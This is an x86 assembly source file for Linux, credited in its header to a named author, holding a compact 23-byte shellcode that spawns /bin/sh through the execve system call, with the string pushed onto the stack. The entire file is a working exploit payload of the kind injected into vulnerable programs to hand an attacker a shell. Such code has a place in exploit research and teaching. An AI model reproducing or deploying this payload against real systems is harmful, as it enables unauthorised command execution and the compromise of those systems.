#
# (linux/x86) execve("/bin/sh", ["/bin/sh", NULL]) / PUSH - 23 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text

	.global _start
	_start:
		push $0xb
		popl %eax
		cdq
                push %edx
                push $0x68732f2f
                push $0x6e69622f
                mov %esp,%ebx
		push %edx
		push %ebx
		mov %esp, %ecx
                int $0x80

